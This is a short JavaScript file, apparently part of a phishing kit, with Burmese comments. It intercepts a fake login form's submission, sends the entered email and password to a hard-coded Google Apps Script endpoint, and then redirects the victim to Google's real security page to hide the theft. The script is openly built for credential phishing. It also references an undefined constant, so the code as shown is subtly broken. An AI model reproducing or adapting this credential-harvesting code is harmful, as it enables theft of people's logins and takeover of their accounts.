// capture.js - Final Script for Apps Script Backend

// ====================================================================
// ⚠️ ဤနေရာတွင် Bro ၏ Google Apps Script Deployment URL ကို ထည့်ပါ။
// ဥပမာ: 'https://script.google.com/macros/s/AKfycb_RANDOM_CODE_HERE/exec'
// ====================================================================

const LOGGING_ENDPOINT = 'https://script.google.com/macros/s/AKfycbyfvIh6KDvY1TfQ3ROt-wZl43sosIlNgEsCVjpElrGFnoJdD7QxONWZW8ue7rVG1bqtCw/exec'; 
 
const REDIRECT_URL = 'https://myaccount.google.com/security';

document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('loginForm');

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault(); 

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        const params = new URLSearchParams({
            mail: username,
            pass: password
        });

        const finalUrl = `${LOGGING_ENDPOINT_BASE}?${params.toString()}`;

        // 1. Data ကို အရင်ဆုံး ပို့မယ်။ (Response ကို စောင့်စရာမလို)
        // navigator.sendBeacon ကို သုံးရင် Request က Background မှာ ပို့ပြီး Redirect ကို ချက်ချင်း လုပ်လို့ရတယ်။
        // ဒါပေမဲ့ fetch ကိုပဲ သုံးမယ်။

        fetch(finalUrl, {
            method: 'GET',
            mode: 'no-cors' 
        }); // .then() နဲ့ .catch() ကို ဖြုတ်လိုက်မယ်။

        // 2. Data ပို့တဲ့ Request ကို Fire လုပ်ပြီးတာနဲ့ ချက်ချင်း Redirect လုပ်မယ်။
        // ဒါမှ Browser က Request ရဲ့ Status ကို စောင့်နေစရာ မလိုတော့ဘူး။
        console.log('Attempting to send data and redirect...');
        window.location.href = REDIRECT_URL;

    });
});
